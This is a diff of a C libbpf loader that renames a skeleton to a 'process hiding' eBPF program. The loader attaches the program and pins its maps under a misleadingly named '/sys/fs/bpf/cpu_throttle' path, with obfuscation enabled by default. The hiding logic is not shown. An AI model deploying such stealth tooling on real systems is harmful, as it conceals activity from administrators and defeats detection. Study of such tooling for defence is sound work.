@@ -9,7 +9,7 @@
 #include <sys/stat.h>
 #include <bpf/libbpf.h>
 #include <bpf/bpf.h>
-#include "output/lsm_hide_bpf.skel.h"
+#include "output/hide_process_bpf.skel.h"
 
 /* Pin paths for shared maps */
 #define PIN_BASEDIR "/sys/fs/bpf/cpu_throttle"
@@ -55,7 +55,7 @@ static int ensure_pin_dir(void)
 }
 
 /* Pin maps to shared filesystem location */
-static int pin_shared_maps(struct lsm_hide_bpf *skel)
+static int pin_shared_maps(struct hide_process_bpf *skel)
 {
     int err;
 
@@ -114,7 +114,7 @@ static void unpin_shared_maps(void)
 
 int main(int argc, char **argv)
 {
-    struct lsm_hide_bpf *skel;
+    struct hide_process_bpf *skel;
     int err;
     bool pin_maps = true;
     bool enable_obfuscation = true;
@@ -162,27 +162,27 @@ int main(int argc, char **argv)
     }
 
     /* Open BPF application */
-    skel = lsm_hide_bpf__open();
+    skel = hide_process_bpf__open();
     if (!skel) {
         fprintf(stderr, "Failed to open BPF skeleton\n");
         return 1;
     }
 
     /* Load & verify BPF programs */
-    err = lsm_hide_bpf__load(skel);
+    err = hide_process_bpf__load(skel);
     if (err) {
         fprintf(stderr, "Failed to load and verify BPF skeleton: %d\n", err);
         goto cleanup;
     }
 
     /* Attach BPF programs */
-    err = lsm_hide_bpf__attach(skel);
+    err = hide_process_bpf__attach(skel);
     if (err) {
         fprintf(stderr, "Failed to attach BPF skeleton: %d\n", err);
         goto cleanup;
     }
 
-    printf("Successfully loaded and attached eBPF LSM program!\n");
+    printf("Successfully loaded and attached eBPF Process Hiding program!\n");
 
     /* Pin maps to shared location */
     if (pin_maps) {
@@ -248,6 +248,6 @@ int main(int argc, char **argv)
     }
 
 cleanup:
-    lsm_hide_bpf__destroy(skel);
+    hide_process_bpf__destroy(skel);
     return err < 0 ? -err : 0;
 }
